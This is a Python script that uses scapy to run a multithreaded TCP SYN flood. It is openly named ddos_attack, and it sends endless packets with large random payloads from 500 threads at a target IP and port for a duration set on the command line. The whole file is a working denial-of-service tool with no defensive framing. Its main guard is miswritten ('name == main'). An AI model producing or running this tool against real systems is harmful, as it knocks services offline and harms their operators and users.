import sys
import threading
from scapy.all import *

def send_tcp_packet(ip, port):
    while True:
        try:
            # Craft TCP SYN packet with larger payload
            packet = IP(dst=ip) / TCP(dport=port, flags="S") / Raw(RandString(size=1400))  # Adjust the payload size as needed
            
            # Send packet
            send(packet, verbose=0)
        except KeyboardInterrupt:
            sys.exit()

def ddos_attack(ip, port, duration):
    # Convert duration to seconds
    duration = int(duration)

    # Start threads for sending packets
    threads = []
    for _ in range(500):  # Adjust the number of threads as needed
        t = threading.Thread(target=send_tcp_packet, args=(ip, port))
        t.daemon = True
        threads.append(t)
        t.start()

    # Run the attack for the specified duration
    time.sleep(duration)

if name == "main":
    if len(sys.argv) != 4:
        print("Usage: python3 tcp.py <ip> <port> <time>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    ddos_attack(ip, port, duration)